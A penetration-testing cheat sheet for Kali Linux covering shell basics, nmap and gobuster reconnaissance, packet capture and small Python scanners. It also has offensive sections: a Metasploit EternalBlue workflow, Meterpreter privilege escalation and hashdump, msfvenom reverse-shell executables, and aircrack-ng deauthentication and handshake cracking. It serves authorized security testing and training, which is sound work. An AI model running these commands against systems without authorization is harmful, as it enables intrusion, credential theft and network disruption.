Kali Linux & Security Engineering Handbook

Quick reference guide for CLI commands, Metasploit Framework, Python scripting, and Network Analysis.

Essential Linux Navigation & Management

Navigation & Working Directory
Check directory, list hidden contents, and change path.
pwd
ls -la
cd /path/to/directory
cd ..
File Operations
Create, copy, move, and remove files or directories.
mkdir new_folder
touch file.txt
cp source.txt dest.txt
mv file.txt /new/path/
rm file.txt
rm -rf directory/
Permissions & Ownership
Make scripts executable and modify file owners.
chmod +x script.sh
chmod 600 private.key
chown user:group file.txt
System & Process Monitoring
Check processes, memory, and kernel details.
uname -a
whoami
id
ps aux
kill -9 <PID>
df -h
free -m

Networking & Reconnaissance

Interface & IP Management
Inspect network interfaces and active sockets.
ip a
ifconfig
netstat -tulnp
ss -tulnp
Network Discovery & Port Scanning
Scan target hosts for open ports and services using Nmap.
nmap -sV -sC -O -p- <target_ip>
netdiscover -r 192.168.1.0/24
DNS & Web Enumeration
Gather DNS records and brute-force web directories.
dig <domain> ANY
nslookup <domain>
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt

Core Operating Workflow
Initialize msfconsole, search modules, and assign target variables.
msfconsole
search eternalblue

show options
set RHOSTS <target_ip>

exploit
Meterpreter Operations
Commands executed within an active Meterpreter shell session.
sysinfo

getsystem
hashdump
shell
background
MSFvenom Staged Payload Generation
Generate standalone executable reverse shell payloads.
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -f exe -o shell.exe
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -f elf -o shell.elf

Wireless & 802.11 Auditing

Aircrack-ng Suite Operations
Enable monitor mode, capture handshakes, and deauthenticate clients.
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo airodump-ng --bssid <BSSID> -c <CHANNEL> -w cap wlan0mon
sudo aireplay-ng --deauth 5 -a <BSSID> -c <CLIENT_MAC> wlan0mon
aircrack-ng -w wordlist.txt -b <BSSID> cap-01.cap
Automated Auditing with Wifite
Run automated wireless auditing against target channels.
sudo wifite -c 1,6,11
sudo wifite --wpa --dict /path/to/wordlist.txt

Packet Analysis (Tcpdump & Tshark)

Tcpdump Packet Capture
Filter traffic using Berkeley Packet Filters (BPF).
tcpdump -i eth0 -n -vv
tcpdump -i eth0 -w output.pcap
tcpdump host 192.168.1.50 and port 80
tcpdump 'tcp[tcpflags] & (tcp-syn) != 0'
Tshark CLI Extraction
Extract protocol fields directly from PCAP files.
tshark -r capture.pcap -Y "http.request" -T fields -e ip.src -e http.host -e http.request.uri
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e ip.src -e dns.qry.name

Security Automation Scripts (Python)

TCP Port Scanner
Standard socket-based TCP scanner snippet.
import socket

target = "127.0.0.1"
ports = [22, 80, 443]

for port in ports:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1.0)
    if s.connect_ex((target, port)) == 0:
        print(f"[+] Port {port} OPEN")
    s.close()
HTTP Directory Checker
Basic web path check script using Requests.
import requests

url = "http://127.0.0.1"
paths = ["admin", "login", "uploads"]

for path in paths:
    res = requests.get(f"{url}/{path}")
    if res.status_code == 200:
        print(f"[+] Found: {url}/{path}")
